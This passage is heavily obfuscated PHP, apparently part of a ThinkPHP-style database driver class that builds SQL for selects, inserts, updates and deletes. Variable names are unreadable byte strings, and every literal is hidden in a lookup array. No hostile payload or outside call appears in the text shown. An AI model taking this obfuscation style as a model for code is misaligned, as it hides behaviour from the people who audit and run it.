$cœ¬Úè½ÜÄ[807] => isset($EŠ÷ˆİ‚ï¶[$cœ¬Úè½ÜÄ[546]]) ? $EŠ÷ˆİ‚ï¶[$cœ¬Úè½ÜÄ[546]] : $cœ¬Úè½ÜÄ[43], $cœ¬Úè½ÜÄ[808] => isset($EŠ÷ˆİ‚ï¶[$cœ¬Úè½ÜÄ[903]]) ? $EŠ÷ˆİ‚ï¶[$cœ¬Úè½ÜÄ[903]] : $cœ¬Úè½ÜÄ[43], $cœ¬Úè½ÜÄ[805] => isset($EŠ÷ˆİ‚ï¶[$cœ¬Úè½ÜÄ[179]]) ? $EŠ÷ˆİ‚ï¶[$cœ¬Úè½ÜÄ[179]] : $cœ¬Úè½ÜÄ[43], $cœ¬Úè½ÜÄ[806] => isset($EŠ÷ˆİ‚ï¶[$cœ¬Úè½ÜÄ[180]]) ? $EŠ÷ˆİ‚ï¶[$cœ¬Úè½ÜÄ[180]] : $cœ¬Úè½ÜÄ[43], $cœ¬Úè½ÜÄ[27] => isset($EŠ÷ˆİ‚ï¶[$cœ¬Úè½ÜÄ[85]]) ? substr($EŠ÷ˆİ‚ï¶[$cœ¬Úè½ÜÄ[85]], 1) : $cœ¬Úè½ÜÄ[43]); } else { preg_match($cœ¬Úè½ÜÄ[904], trim($cÆàÃ…Áâø), $BŠ¶‡Ùä™“); $Bä›¥ŒÍ£§ = array($cœ¬Úè½ÜÄ[882] => $BŠ¶‡Ùä™“[1], $cœ¬Úè½ÜÄ[807] => $BŠ¶‡Ùä™“[2], $cœ¬Úè½ÜÄ[808] => $BŠ¶‡Ùä™“[3], $cœ¬Úè½ÜÄ[805] => $BŠ¶‡Ùä™“[4], $cœ¬Úè½ÜÄ[806] => $BŠ¶‡Ùä™“[5], $cœ¬Úè½ÜÄ[27] => $BŠ¶‡Ùä™“[6]); } $Bä›¥ŒÍ£§[$cœ¬Úè½ÜÄ[834]] = $cœ¬Úè½ÜÄ[43]; return $Bä›¥ŒÍ£§; } protected function debug() { $bœ‚ ­‹ÒÇ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $bœ‚ ­‹ÒÇ[905]; if (think_config($bœ‚ ­‹ÒÇ[906])) { think_status($bœ‚ ­‹ÒÇ[907]); think_trace($this->queryStr . $bœ‚ ­‹ÒÇ[908] . think_status($bœ‚ ­‹ÒÇ[30], $bœ‚ ­‹ÒÇ[907], 6) . $bœ‚ ­‹ÒÇ[909], $bœ‚ ­‹ÒÇ[43], $bœ‚ ­‹ÒÇ[910]); } } protected function parseLock($DÚ½Ë™ÅÑÉ = false) { $bÄ³ÜÂ‡…¡ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$DÚ½Ë™ÅÑÉ) { return $bÄ³ÜÂ‡…¡[43]; } if ($bÄ³ÜÂ‡…¡[836] == $this->dbType) { return $bÄ³ÜÂ‡…¡[911]; } return $bÄ³ÜÂ‡…¡[912]; } protected function parseSet($d©é»»œ‡¦) { $B¯’¼ƒãëò =& $_SERVER[çŞáÓæÚô‚Ô‡]; foreach ($d©é»»œ‡¦ as $c÷ï®¼½É => $c ¤è¹ÓÒ) { if (is_array($c ¤è¹ÓÒ) && $B¯’¼ƒãëò[294] == $c ¤è¹ÓÒ[0]) { $e ¿§î ’ô[] = $this->parseKey($c÷ï®¼½É) . $B¯’¼ƒãëò[913] . $c ¤è¹ÓÒ[1]; } elseif (is_scalar($c ¤è¹ÓÒ) || is_null($c ¤è¹ÓÒ)) { $e ¿§î ’ô[] = $this->parseKey($c÷ï®¼½É) . $B¯’¼ƒãëò[913] . $this->parseValue($c ¤è¹ÓÒ); } } return $B¯’¼ƒãëò[914] . implode($B¯’¼ƒãëò[57], $e ¿§î ’ô); } protected function bindParam($EÑä¬‰©, $fß‚×å„×É) { $this->bind[$_SERVER[çŞáÓæÚô‚Ô‡][4] . $EÑä¬‰©] = $fß‚×å„×É; } protected function parseBind($e«¨›áãø) { $e«¨›áãø = array_merge($this->bind, $e«¨›áãø); $this->bind = array(); return $e«¨›áãø; } function parseKey(&$a¼½³âªó½, $Aâœ‚‡ë¥ = true) { if ($Aâœ‚‡ë¥) { $a¼½³âªó½ = $this->parseKeyCheck($a¼½³âªó½); } return $a¼½³âªó½; } function parseKeyCheck($bë¨«ªŸÎÜ) { $a£”§ÂÍ  =& $_SERVER[çŞáÓæÚô‚Ô‡]; $bë¨«ªŸÎÜ = trim($bë¨«ªŸÎÜ); if (!preg_match($a£”§ÂÍ [915], $bë¨«ªŸÎÜ)) { think_exception($a£”§ÂÍ [916] . $bë¨«ªŸÎÜ); } return $bë¨«ªŸÎÜ; } protected function parseValue($b–‘®ŸÅ†Á) { $A¹Ûµ´ÑÉ‘ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (is_string($b–‘®ŸÅ†Á)) { $b–‘®ŸÅ†Á = $A¹Ûµ´ÑÉ‘[875] . $this->escapeString($b–‘®ŸÅ†Á) . $A¹Ûµ´ÑÉ‘[875]; } elseif (isset($b–‘®ŸÅ†Á[0]) && is_string($b–‘®ŸÅ†Á[0]) && strtolower($b–‘®ŸÅ†Á[0]) == $A¹Ûµ´ÑÉ‘[294]) { $b–‘®ŸÅ†Á = $this->escapeString($b–‘®ŸÅ†Á[1]); } elseif (is_array($b–‘®ŸÅ†Á)) { $b–‘®ŸÅ†Á = array_map(array($this, $A¹Ûµ´ÑÉ‘[876]), $b–‘®ŸÅ†Á); } elseif (is_bool($b–‘®ŸÅ†Á)) { $b–‘®ŸÅ†Á = $b–‘®ŸÅ†Á ? $A¹Ûµ´ÑÉ‘[93] : $A¹Ûµ´ÑÉ‘[479]; } elseif (is_null($b–‘®ŸÅ†Á)) { $b–‘®ŸÅ†Á = $A¹Ûµ´ÑÉ‘[109]; } return $b–‘®ŸÅ†Á; } protected function parseField($A–‡Õ«šİ¡) { $Fêâëö÷…í =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (is_string($A–‡Õ«šİ¡) && strpos($A–‡Õ«šİ¡, $Fêâëö÷…í[57])) { $A–‡Õ«šİ¡ = explode($Fêâëö÷…í[57], $A–‡Õ«šİ¡); } if (is_array($A–‡Õ«šİ¡)) { $dÅºÄÚšˆ = array(); foreach ($A–‡Õ«šİ¡ as $C¿¼º¨ä¾ => $C…••™›‘) { if (!is_numeric($C¿¼º¨ä¾)) { $dÅºÄÚšˆ[] = $this->parseKey($C¿¼º¨ä¾) . $Fêâëö÷…í[917] . $this->parseKey($C…••™›‘); } else { $dÅºÄÚšˆ[] = $this->parseKey($C…••™›‘); } } $e‡ù¢Š·¨ = implode($Fêâëö÷…í[57], $dÅºÄÚšˆ); } elseif (is_string($A–‡Õ«šİ¡) && !empty($A–‡Õ«šİ¡)) { $e‡ù¢Š·¨ = $A–‡Õ«šİ¡; } else { $e‡ù¢Š·¨ = $Fêâëö÷…í[186]; } return $e‡ù¢Š·¨; } protected function parseTable($Dµš†‹êğ‡) { $CŸŒœ¨¾Ü¦ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (is_array($Dµš†‹êğ‡)) { $B½µŒÃªİÈ = array(); foreach ($Dµš†‹êğ‡ as $EÇ×½Ğ²ö => $cè×İÎ“ª) { if (!is_numeric($EÇ×½Ğ²ö)) { $B½µŒÃªİÈ[] = $this->parseKey($EÇ×½Ğ²ö) . $CŸŒœ¨¾Ü¦[60] . $this->parseKey($cè×İÎ“ª); } else { $B½µŒÃªİÈ[] = $this->parseKey($EÇ×½Ğ²ö); } } $Dµš†‹êğ‡ = $B½µŒÃªİÈ; } elseif (is_string($Dµš†‹êğ‡)) { if (strstr($Dµš†‹êğ‡, $CŸŒœ¨¾Ü¦[60])) { return $Dµš†‹êğ‡; } $Dµš†‹êğ‡ = explode($CŸŒœ¨¾Ü¦[57], $Dµš†‹êğ‡); array_walk($Dµš†‹êğ‡, array($this, $CŸŒœ¨¾Ü¦[824])); } return $CŸŒœ¨¾Ü¦[918] . trim(implode($CŸŒœ¨¾Ü¦[919], $Dµš†‹êğ‡), $CŸŒœ¨¾Ü¦[830]) . $CŸŒœ¨¾Ü¦[918]; } protected function parseWhere($D§È¬Õ¼æ) { $CŠª¥à‡› =& $_SERVER[çŞáÓæÚô‚Ô‡]; $C‹ê¶†‚¿ = $CŠª¥à‡›[43]; if (is_string($D§È¬Õ¼æ)) { $C‹ê¶†‚¿ = $D§È¬Õ¼æ; } else { $b ù‰´’šÂ = isset($D§È¬Õ¼æ[$CŠª¥à‡›[920]]) ? strtoupper($D§È¬Õ¼æ[$CŠª¥à‡›[920]]) : $CŠª¥à‡›[43]; if (in_array($b ù‰´’šÂ, array($CŠª¥à‡›[921], $CŠª¥à‡›[922], $CŠª¥à‡›[923]))) { $b ù‰´’šÂ = $CŠª¥à‡›[60] . $b ù‰´’šÂ . $CŠª¥à‡›[60]; unset($D§È¬Õ¼æ[$CŠª¥à‡›[920]]); } else { $b ù‰´’šÂ = $CŠª¥à‡›[924]; } foreach ($D§È¬Õ¼æ as $bÛˆ‡½ŒÆ‚ => $E¿¸¹ï¸˜„) { $C‹ê¶†‚¿ .= $CŠª¥à‡›[274]; if (is_numeric($bÛˆ‡½ŒÆ‚)) { $bÛˆ‡½ŒÆ‚ = $CŠª¥à‡›[925]; } if (0 === strpos($bÛˆ‡½ŒÆ‚, $CŠª¥à‡›[80])) { $C‹ê¶†‚¿ .= $this->parseThinkWhere($bÛˆ‡½ŒÆ‚, $E¿¸¹ï¸˜„); } else { if (!preg_match($CŠª¥à‡›[926], trim($bÛˆ‡½ŒÆ‚))) { think_exception(think_lang($CŠª¥à‡›[927]) . $CŠª¥à‡›[4] . $bÛˆ‡½ŒÆ‚); } $fáÈòëÄ×¸ = is_array($E¿¸¹ï¸˜„) && isset($E¿¸¹ï¸˜„[$CŠª¥à‡›[928]]); $bÛˆ‡½ŒÆ‚ = trim($bÛˆ‡½ŒÆ‚); if (strpos($bÛˆ‡½ŒÆ‚, $CŠª¥à‡›[280])) { $d¦Ší²©Õ = explode($CŠª¥à‡›[280], $bÛˆ‡½ŒÆ‚); $eáÔ¯‚´Ö = array(); foreach ($d¦Ší²©Õ as $dïíùƒš¤¦ => $eùÂÙ…ö‰) { $AÂªã…Œ¾¡ = $fáÈòëÄ×¸ ? $E¿¸¹ï¸˜„[$dïíùƒš¤¦] : $E¿¸¹ï¸˜„; $eáÔ¯‚´Ö[] = $CŠª¥à‡›[257] . $this->parseWhereItem($this->parseKey($eùÂÙ…ö‰), $AÂªã…Œ¾¡) . $CŠª¥à‡›[823]; } $C‹ê¶†‚¿ .= implode($CŠª¥à‡›[929], $eáÔ¯‚´Ö); } elseif (strpos($bÛˆ‡½ŒÆ‚, $CŠª¥à‡›[281])) { $d¦Ší²©Õ = explode($CŠª¥à‡›[281], $bÛˆ‡½ŒÆ‚); $eáÔ¯‚´Ö = array(); foreach ($d¦Ší²©Õ as $dïíùƒš¤¦ => $eùÂÙ…ö‰) { $AÂªã…Œ¾¡ = $fáÈòëÄ×¸ ? $E¿¸¹ï¸˜„[$dïíùƒš¤¦] : $E¿¸¹ï¸˜„; $eáÔ¯‚´Ö[] = $CŠª¥à‡›[257] . $this->parseWhereItem($this->parseKey($eùÂÙ…ö‰), $AÂªã…Œ¾¡) . $CŠª¥à‡›[823]; } $C‹ê¶†‚¿ .= implode($CŠª¥à‡›[924], $eáÔ¯‚´Ö); } else { $C‹ê¶†‚¿ .= $this->parseWhereItem($this->parseKey($bÛˆ‡½ŒÆ‚), $E¿¸¹ï¸˜„); } } $C‹ê¶†‚¿ .= $CŠª¥à‡›[275] . $b ù‰´’šÂ; } $C‹ê¶†‚¿ = substr($C‹ê¶†‚¿, 0, -strlen($b ù‰´’šÂ)); } return empty($C‹ê¶†‚¿) ? $CŠª¥à‡›[43] : $CŠª¥à‡›[930] . $C‹ê¶†‚¿; } protected function parseWhereItem($cÖç—ËÊâ°, $BŸîµ°‡Æë) { $bâ•¼³Ó¹ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $EŒµŞ‹¾Ìß = $bâ•¼³Ó¹[43]; if (is_array($BŸîµ°‡Æë)) { if (is_string($BŸîµ°‡Æë[0])) { $Bˆ¸×¥–†¦ = strtolower($BŸîµ°‡Æë[0]); if (in_array($BŸîµ°‡Æë[0], array($bâ•¼³Ó¹[913], $bâ•¼³Ó¹[931], $bâ•¼³Ó¹[932], $bâ•¼³Ó¹[933], $bâ•¼³Ó¹[934], $bâ•¼³Ó¹[935]))) { $EŒµŞ‹¾Ìß .= $cÖç—ËÊâ° . $bâ•¼³Ó¹[60] . $BŸîµ°‡Æë[0] . $bâ•¼³Ó¹[60] . $this->parseValue($BŸîµ°‡Æë[1]); } elseif (preg_match($bâ•¼³Ó¹[936], $BŸîµ°‡Æë[0])) { $EŒµŞ‹¾Ìß .= $cÖç—ËÊâ° . $bâ•¼³Ó¹[60] . $this->exp[$Bˆ¸×¥–†¦] . $bâ•¼³Ó¹[60] . $this->parseValue($BŸîµ°‡Æë[1]); } elseif (preg_match($bâ•¼³Ó¹[937], $BŸîµ°‡Æë[0])) { if (is_array($BŸîµ°‡Æë[1])) { $f®òÒ¯¬Ê = isset($BŸîµ°‡Æë[2]) ? strtoupper($BŸîµ°‡Æë[2]) : $bâ•¼³Ó¹[922]; if (in_array($f®òÒ¯¬Ê, array($bâ•¼³Ó¹[921], $bâ•¼³Ó¹[922], $bâ•¼³Ó¹[923]))) { $D™¹áË†áê = array(); foreach ($BŸîµ°‡Æë[1] as $C‰«Î†©¹½) { $D™¹áË†áê[] = $cÖç—ËÊâ° . $bâ•¼³Ó¹[60] . $this->exp[$Bˆ¸×¥–†¦] . $bâ•¼³Ó¹[60] . $this->parseValue($C‰«Î†©¹½); } $EŒµŞ‹¾Ìß .= $bâ•¼³Ó¹[257] . implode($bâ•¼³Ó¹[60] . $f®òÒ¯¬Ê . $bâ•¼³Ó¹[60], $D™¹áË†áê) . $bâ•¼³Ó¹[823]; } } else { $EŒµŞ‹¾Ìß .= $cÖç—ËÊâ° . $bâ•¼³Ó¹[60] . $this->exp[$Bˆ¸×¥–†¦] . $bâ•¼³Ó¹[60] . $this->parseValue($BŸîµ°‡Æë[1]); } } elseif ($bâ•¼³Ó¹[294] == $Bˆ¸×¥–†¦) { $EŒµŞ‹¾Ìß .= $bâ•¼³Ó¹[821] . $cÖç—ËÊâ° . $bâ•¼³Ó¹[60] . $BŸîµ°‡Æë[1] . $bâ•¼³Ó¹[938]; } elseif (preg_match($bâ•¼³Ó¹[939], $BŸîµ°‡Æë[0])) { if (isset($BŸîµ°‡Æë[2]) && $bâ•¼³Ó¹[294] == $BŸîµ°‡Æë[2]) { $EŒµŞ‹¾Ìß .= $cÖç—ËÊâ° . $bâ•¼³Ó¹[60] . $this->exp[$Bˆ¸×¥–†¦] . $bâ•¼³Ó¹[60] . $BŸîµ°‡Æë[1]; } else { if (is_string($BŸîµ°‡Æë[1])) { $BŸîµ°‡Æë[1] = explode($bâ•¼³Ó¹[57], $BŸîµ°‡Æë[1]); } $cÙœ˜Ó›İä = implode($bâ•¼³Ó¹[57], $this->parseValue($BŸîµ°‡Æë[1])); $EŒµŞ‹¾Ìß .= $cÖç—ËÊâ° . $bâ•¼³Ó¹[60] . $this->exp[$Bˆ¸×¥–†¦] . $bâ•¼³Ó¹[821] . $cÙœ˜Ó›İä . $bâ•¼³Ó¹[823]; } } elseif (preg_match($bâ•¼³Ó¹[940], $BŸîµ°‡Æë[0])) { $b¦«¶òœ‹´ = is_string($BŸîµ°‡Æë[1]) ? explode($bâ•¼³Ó¹[57], $BŸîµ°‡Æë[1]) : $BŸîµ°‡Æë[1]; $EŒµŞ‹¾Ìß .= $bâ•¼³Ó¹[821] . $cÖç—ËÊâ° . $bâ•¼³Ó¹[60] . $this->exp[$Bˆ¸×¥–†¦] . $bâ•¼³Ó¹[60] . $this->parseValue($b¦«¶òœ‹´[0]) . $bâ•¼³Ó¹[924] . $this->parseValue($b¦«¶òœ‹´[1]) . $bâ•¼³Ó¹[275]; } else { think_exception(think_lang($bâ•¼³Ó¹[927]) . $bâ•¼³Ó¹[4] . $BŸîµ°‡Æë[0]); } } else { $bãõ·ĞäİŸ = count($BŸîµ°‡Æë); $FŒ¢œÖøŒÍ = isset($BŸîµ°‡Æë[$bãõ·ĞäİŸ - 1]) ? strtoupper($BŸîµ°‡Æë[$bãõ·ĞäİŸ - 1]) : $bâ•¼³Ó¹[43]; if (in_array($FŒ¢œÖøŒÍ, array($bâ•¼³Ó¹[921], $bâ•¼³Ó¹[922], $bâ•¼³Ó¹[923]))) { $bãõ·ĞäİŸ = $bãõ·ĞäİŸ - 1; } else { $FŒ¢œÖøŒÍ = $bâ•¼³Ó¹[921]; } for ($A¹‚’ƒ Ä½ = 0; $A¹‚’ƒ Ä½ < $bãõ·ĞäİŸ; $A¹‚’ƒ Ä½++) { $b¦«¶òœ‹´ = is_array($BŸîµ°‡Æë[$A¹‚’ƒ Ä½]) ? $BŸîµ°‡Æë[$A¹‚’ƒ Ä½][1] : $BŸîµ°‡Æë[$A¹‚’ƒ Ä½]; if ($bâ•¼³Ó¹[294] == strtolower($BŸîµ°‡Æë[$A¹‚’ƒ Ä½][0])) { $EŒµŞ‹¾Ìß .= $bâ•¼³Ó¹[257] . $cÖç—ËÊâ° . $bâ•¼³Ó¹[60] . $b¦«¶òœ‹´ . $bâ•¼³Ó¹[938] . $FŒ¢œÖøŒÍ . $bâ•¼³Ó¹[60]; } else { $e¼œŞæÅ£Ä = is_array($BŸîµ°‡Æë[$A¹‚’ƒ Ä½]) ? $this->exp[strtolower($BŸîµ°‡Æë[$A¹‚’ƒ Ä½][0])] : $bâ•¼³Ó¹[913]; if (!$e¼œŞæÅ£Ä && is_array($BŸîµ°‡Æë[$A¹‚’ƒ Ä½]) && in_array($BŸîµ°‡Æë[$A¹‚’ƒ Ä½][0], array($bâ•¼³Ó¹[913], $bâ•¼³Ó¹[931], $bâ•¼³Ó¹[932], $bâ•¼³Ó¹[933], $bâ•¼³Ó¹[934], $bâ•¼³Ó¹[935]))) { $e¼œŞæÅ£Ä = $BŸîµ°‡Æë[$A¹‚’ƒ Ä½][0]; } $EŒµŞ‹¾Ìß .= $bâ•¼³Ó¹[257] . $cÖç—ËÊâ° . $bâ•¼³Ó¹[60] . $e¼œŞæÅ£Ä . $bâ•¼³Ó¹[60] . $this->parseValue($b¦«¶òœ‹´) . $bâ•¼³Ó¹[938] . $FŒ¢œÖøŒÍ . $bâ•¼³Ó¹[60]; } } $EŒµŞ‹¾Ìß = substr($EŒµŞ‹¾Ìß, 0, -4); } } else { $EŒµŞ‹¾Ìß .= $cÖç—ËÊâ° . $bâ•¼³Ó¹[941] . $this->parseValue($BŸîµ°‡Æë); } return $EŒµŞ‹¾Ìß; } protected function parseThinkWhere($b†Ø¾•”Ó, $d…ƒ£çİ´ˆ) { $EÎß´’¼ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $E†÷×‹­® = $EÎß´’¼[43]; switch ($b†Ø¾•”Ó) { case $EÎß´’¼[348]: $E†÷×‹­® = $d…ƒ£çİ´ˆ; break; case $EÎß´’¼[925]: $E†÷×‹­® = is_string($d…ƒ£çİ´ˆ) ? $d…ƒ£çİ´ˆ : substr($this->parseWhere($d…ƒ£çİ´ˆ), 6); break; case $EÎß´’¼[942]: parse_str($d…ƒ£çİ´ˆ, $F–ÊÜ´©³); if (isset($F–ÊÜ´©³[$EÎß´’¼[920]])) { $c‘ÃÈÕ×˜— = $EÎß´’¼[60] . strtoupper($F–ÊÜ´©³[$EÎß´’¼[920]]) . $EÎß´’¼[60]; unset($F–ÊÜ´©³[$EÎß´’¼[920]]); } else { $c‘ÃÈÕ×˜— = $EÎß´’¼[924]; } $F»ÊĞ†àÎº = array(); foreach ($F–ÊÜ´©³ as $c¤Ù»‹ªæô => $e›»¸Ä…¡¥) { $F»ÊĞ†àÎº[] = $this->parseKey($c¤Ù»‹ªæô) . $EÎß´’¼[941] . $this->parseValue($e›»¸Ä…¡¥); } $E†÷×‹­® = implode($c‘ÃÈÕ×˜—, $F»ÊĞ†àÎº); break; } return $E†÷×‹­®; } protected function parseLimit($cÉïÖ²Ç‰í) { $E¬ñÈ·À ß =& $_SERVER[çŞáÓæÚô‚Ô‡]; return !empty($cÉïÖ²Ç‰í) ? $E¬ñÈ·À ß[58] . $cÉïÖ²Ç‰í . $E¬ñÈ·À ß[60] : $E¬ñÈ·À ß[43]; } protected function parseJoin($F•‡º¢ß) { $a¸³­³ ùŒ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $fá„ÀŞ‘ëˆ = $a¸³­³ ùŒ[43]; if (!empty($F•‡º¢ß)) { if (is_array($F•‡º¢ß)) { foreach ($F•‡º¢ß as $Dæ£²™ŠåÒ => $fã‡¢¤‘¯´) { if (!1 !== stripos($fã‡¢¤‘¯´, $a¸³­³ ùŒ[943])) { $fá„ÀŞ‘ëˆ .= $a¸³­³ ùŒ[60] . $fã‡¢¤‘¯´; } else { $fá„ÀŞ‘ëˆ .= $a¸³­³ ùŒ[944] . $fã‡¢¤‘¯´; } } } else { $fá„ÀŞ‘ëˆ .= $a¸³­³ ùŒ[944] . $F•‡º¢ß; } } $fá„ÀŞ‘ëˆ = preg_replace($a¸³­³ ùŒ[945], think_config($a¸³­³ ùŒ[848]) . $a¸³­³ ùŒ[946], $fá„ÀŞ‘ëˆ); return $fá„ÀŞ‘ëˆ; } protected function parseOrder($BÇ–»Ã–ùĞ) { $E·»ù’ïŸ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (is_array($BÇ–»Ã–ùĞ)) { $Cè‹ÃÆ‡¤… = array(); foreach ($BÇ–»Ã–ùĞ as $CÅáÁ›Óæ => $EØ¼¼õÙ¶) { if (is_numeric($CÅáÁ›Óæ)) { $Cè‹ÃÆ‡¤…[] = $this->parseKey($EØ¼¼õÙ¶); } else { $EØ¼¼õÙ¶ = in_array(strtoupper(trim($EØ¼¼õÙ¶)), array($E·»ù’ïŸ[947], $E·»ù’ïŸ[948])) ? $E·»ù’ïŸ[60] . $EØ¼¼õÙ¶ : $E·»ù’ïŸ[43]; if (preg_match($E·»ù’ïŸ[949], $CÅáÁ›Óæ)) { $Cè‹ÃÆ‡¤…[] = $this->parseKey($CÅáÁ›Óæ) . $EØ¼¼õÙ¶; } else { think_exception($E·»ù’ïŸ[950] . $CÅáÁ›Óæ); } } } $BÇ–»Ã–ùĞ = implode($E·»ù’ïŸ[57], $Cè‹ÃÆ‡¤…); } return !empty($BÇ–»Ã–ùĞ) ? $E·»ù’ïŸ[951] . $BÇ–»Ã–ùĞ : $E·»ù’ïŸ[43]; } protected function parseGroup($B¿„öíì) { $d›–¨Ÿ‘³ì =& $_SERVER[çŞáÓæÚô‚Ô‡]; return !empty($B¿„öíì) ? $d›–¨Ÿ‘³ì[952] . $B¿„öíì : $d›–¨Ÿ‘³ì[43]; } protected function parseHaving($Cñ¾ˆ·ß©Š) { $b¼µšÀ‡— =& $_SERVER[çŞáÓæÚô‚Ô‡]; return !empty($Cñ¾ˆ·ß©Š) ? $b¼µšÀ‡—[953] . $Cñ¾ˆ·ß©Š : $b¼µšÀ‡—[43]; } protected function parseComment($Cëª¥’†ê‘) { $B¢´à‡»¾À =& $_SERVER[çŞáÓæÚô‚Ô‡]; return !empty($Cëª¥’†ê‘) ? $B¢´à‡»¾À[954] . $Cëª¥’†ê‘ . $B¢´à‡»¾À[955] : $B¢´à‡»¾À[43]; } protected function parseDistinct($F˜âİ·»©) { $e·¸Šœ£È =& $_SERVER[çŞáÓæÚô‚Ô‡]; return !empty($F˜âİ·»©) ? $e·¸Šœ£È[956] : $e·¸Šœ£È[43]; } protected function parseUnion($bÊÍ‹ÊæõÀ) { $b®Ü‰ŸÈ” =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (empty($bÊÍ‹ÊæõÀ)) { return $b®Ü‰ŸÈ”[43]; } if (isset($bÊÍ‹ÊæõÀ[$b®Ü‰ŸÈ”[345]])) { $C›¨æ‹£…¾ = $b®Ü‰ŸÈ”[957]; unset($bÊÍ‹ÊæõÀ[$b®Ü‰ŸÈ”[345]]); } else { $C›¨æ‹£…¾ = $b®Ü‰ŸÈ”[958]; } foreach ($bÊÍ‹ÊæõÀ as $Bˆ¦©·ÖÖ) { $B¥÷±ÔèÃ[] = $C›¨æ‹£…¾ . (is_array($Bˆ¦©·ÖÖ) ? $this->buildSelectSql($Bˆ¦©·ÖÖ) : $Bˆ¦©·ÖÖ); } return implode($b®Ü‰ŸÈ”[60], $B¥÷±ÔèÃ); } public function insert($Cßïì·‘Á÷, $f”„à‹“ìƒ = array(), $bß÷‚›¸Æ = false) { goto Eáí¾•†Ì‹; B½´Ò¥¸÷: $CôìÑÃòˆê .= $this->parseComment(!empty($f”„à‹“ìƒ[$e¢ï¦¹­’[350]]) ? $f”„à‹“ìƒ[$e¢ï¦¹­’[350]] : $e¢ï¦¹­’[43]); return $this->execute($CôìÑÃòˆê, $this->parseBind(!empty($f”„à‹“ìƒ[$e¢ï¦¹­’[282]]) ? $f”„à‹“ìƒ[$e¢ï¦¹­’[282]] : array())); goto bã²¶áäÛ•; A†®–¢ï¿¤: foreach ($Cßïì·‘Á÷ as $d¾®¸¦ˆ­Ò => $b¯È¨…è¨Ê) { if (is_array($b¯È¨…è¨Ê) && $e¢ï¦¹­’[294] == $b¯È¨…è¨Ê[0]) { $BìŞÍ•Ä¢Æ[] = $this->parseKey($d¾®¸¦ˆ­Ò); $f¡ñÊê Åø[] = $b¯È¨…è¨Ê[1]; } elseif (is_scalar($b¯È¨…è¨Ê) || is_null($b¯È¨…è¨Ê)) { $BìŞÍ•Ä¢Æ[] = $this->parseKey($d¾®¸¦ˆ­Ò); $f¡ñÊê Åø[] = $this->parseValue($b¯È¨…è¨Ê); } } $CôìÑÃòˆê = ($bß÷‚›¸Æ ? $e¢ï¦¹­’[825] : $e¢ï¦¹­’[826]) . $e¢ï¦¹­’[827] . $this->parseTable($f”„à‹“ìƒ[$e¢ï¦¹­’[276]]) . $e¢ï¦¹­’[821] . implode($e¢ï¦¹­’[57], $BìŞÍ•Ä¢Æ) . $e¢ï¦¹­’[822] . implode($e¢ï¦¹­’[57], $f¡ñÊê Åø) . $e¢ï¦¹­’[823]; $CôìÑÃòˆê .= $this->parseLock(isset($f”„à‹“ìƒ[$e¢ï¦¹­’[780]]) ? $f”„à‹“ìƒ[$e¢ï¦¹­’[780]] : !1); goto B½´Ò¥¸÷; Eáí¾•†Ì‹: $e¢ï¦¹­’ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $f¡ñÊê Åø = $BìŞÍ•Ä¢Æ = array(); $this->model = $f”„à‹“ìƒ[$e¢ï¦¹­’[278]]; goto A†®–¢ï¿¤; bã²¶áäÛ•: } public function selectInsert($f‹ä¯“—½÷, $e¦Œ‡Ú¸›±, $BÕìö×˜¢ = array()) { goto c»¬­öà§³; c‚‰Äƒ£Ì: array_walk($f‹ä¯“—½÷, array($this, $c¼“å¶è¬[824])); $CÎ·»µòñÀ = $c¼“å¶è¬[959] . $this->parseTable($e¦Œ‡Ú¸›±) . $c¼“å¶è¬[821] . implode($c¼“å¶è¬[57], $f‹ä¯“—½÷) . $c¼“å¶è¬[938]; $CÎ·»µòñÀ .= $this->buildSelectSql($BÕìö×˜¢); goto AŒŞ¥í„; c»¬­öà§³: $c¼“å¶è¬ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $this->model = $BÕìö×˜¢[$c¼“å¶è¬[278]]; if (is_string($f‹ä¯“—½÷)) { $f‹ä¯“—½÷ = explode($c¼“å¶è¬[57], $f‹ä¯“—½÷); } goto c‚‰Äƒ£Ì; AŒŞ¥í„: return $this->execute($CÎ·»µòñÀ, $this->parseBind(!empty($BÕìö×˜¢[$c¼“å¶è¬[282]]) ? $BÕìö×˜¢[$c¼“å¶è¬[282]] : array())); goto C¾Àë¤×àÖ; C¾Àë¤×àÖ: } public function update($aĞ™åÎˆ»§, $C—™¤Ë­¯) { $f„ê¯µë„¿ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $this->model = $C—™¤Ë­¯[$f„ê¯µë„¿[278]]; $B¦»½Ç¬‚ª = $f„ê¯µë„¿[960] . $this->parseTable($C—™¤Ë­¯[$f„ê¯µë„¿[276]]) . $this->parseSet($aĞ™åÎˆ»§) . $this->parseWhere(!empty($C—™¤Ë­¯[$f„ê¯µë„¿[272]]) ? $C—™¤Ë­¯[$f„ê¯µë„¿[272]] : $f„ê¯µë„¿[43]) . $this->parseOrder(!empty($C—™¤Ë­¯[$f„ê¯µë„¿[359]]) ? $C—™¤Ë­¯[$f„ê¯µë„¿[359]] : $f„ê¯µë„¿[43]) . $this->parseLimit(!empty($C—™¤Ë­¯[$f„ê¯µë„¿[289]]) ? $C—™¤Ë­¯[$f„ê¯µë„¿[289]] : $f„ê¯µë„¿[43]) . $this->parseLock(isset($C—™¤Ë­¯[$f„ê¯µë„¿[780]]) ? $C—™¤Ë­¯[$f„ê¯µë„¿[780]] : !1) . $this->parseComment(!empty($C—™¤Ë­¯[$f„ê¯µë„¿[350]]) ? $C—™¤Ë­¯[$f„ê¯µë„¿[350]] : $f„ê¯µë„¿[43]); return $this->execute($B¦»½Ç¬‚ª, $this->parseBind(!empty($C—™¤Ë­¯[$f„ê¯µë„¿[282]]) ? $C—™¤Ë­¯[$f„ê¯µë„¿[282]] : array())); } public function delete($DÊŞ×Œ = array()) { $eªæ•¯‹øµ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $this->model = $DÊŞ×Œ[$eªæ•¯‹øµ[278]]; $e¢ĞˆÀğœ = $eªæ•¯‹øµ[961] . 